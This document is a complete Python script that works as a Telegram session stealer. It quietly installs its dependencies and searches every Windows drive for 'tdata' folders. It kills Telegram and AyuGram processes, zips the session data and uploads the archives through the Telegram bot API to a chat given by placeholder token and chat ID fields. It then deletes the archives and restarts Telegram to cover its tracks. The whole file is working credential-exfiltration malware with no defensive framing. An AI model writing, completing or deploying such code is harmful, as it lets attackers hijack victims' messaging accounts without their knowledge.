import os
import sys
import subprocess
import time
import string
import zipfile
import requests
import psutil
from datetime import datetime


def install_dependencies():
    required = ['requests', 'psutil']
    for lib in required:
        try:
            __import__(lib)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


install_dependencies()

TELEGRAM_BOT_TOKEN = "{{BOT_TOKEN}}"
TELEGRAM_CHAT_ID = "{{CHAT_ID}}"


def get_available_drives():
    drives = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:\\"
        if os.path.exists(drive):
            drives.append(drive)
    return drives


def search_tdata_folders(root_path, found_folders):
    try:
        for entry in os.scandir(root_path):
            try:
                if entry.is_dir(follow_symlinks=False):
                    if entry.name.lower() == 'tdata':
                        found_folders.append(entry.path)
                    else:
                        search_tdata_folders(entry.path, found_folders)
            except (PermissionError, Exception):
                pass
    except (PermissionError, Exception):
        pass


def find_all_tdata_folders():
    drives = get_available_drives()
    found_folders = []
    for drive in drives:
        search_tdata_folders(drive, found_folders)
    return found_folders


def close_telegram():
    telegram_processes = ['Telegram.exe', 'telegram.exe', 'AyuGram.exe', 'ayugram.exe']
    closed_info = []
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            if proc.info['name'] in telegram_processes:
                exe_path = proc.info['exe']
                proc.kill()
                closed_info.append({'name': proc.info['name'], 'path': exe_path})
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    if closed_info:
        time.sleep(2)
    return closed_info


def start_telegram(closed_info):
    if not closed_info:
        return
    for info in closed_info:
        try:
            subprocess.Popen([info['path']], shell=False)
        except Exception:
            pass


def create_archive(source_path, folder_number=None):
    if not os.path.exists(source_path):
        return None
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    folder_name = os.path.basename(source_path)
    archive_name = f"tdata_{folder_number}_{timestamp}.zip" if folder_number else f"{folder_name}_{timestamp}.zip"

    try:
        with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
            for root, dirs, files in os.walk(source_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, source_path)
                    zipf.write(file_path, arcname)


        if os.path.getsize(archive_name) / (1024 * 1024) > 50:
            os.remove(archive_name)
            return None
        return archive_name
    except Exception:
        return None


def send_to_telegram(file_path, bot_token, chat_id, caption=""):
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    try:
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {'chat_id': chat_id, 'caption': caption}
            requests.post(url, files=files, data=data, timeout=300)
            return True
    except Exception:
        return False


def main():

    found_folders = find_all_tdata_folders()
    if not found_folders:
        return


    closed_info = close_telegram()


    for i, folder in enumerate(found_folders, 1):
        archive_path = create_archive(folder, i)
        if archive_path:
            caption = f"📁 tdata #{i}\n📍 Путь: {folder}"
            send_to_telegram(archive_path, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, caption)
            try:
                os.remove(archive_path)
            except Exception:
                pass


    start_telegram(closed_info)


if __name__ == "__main__":
    main()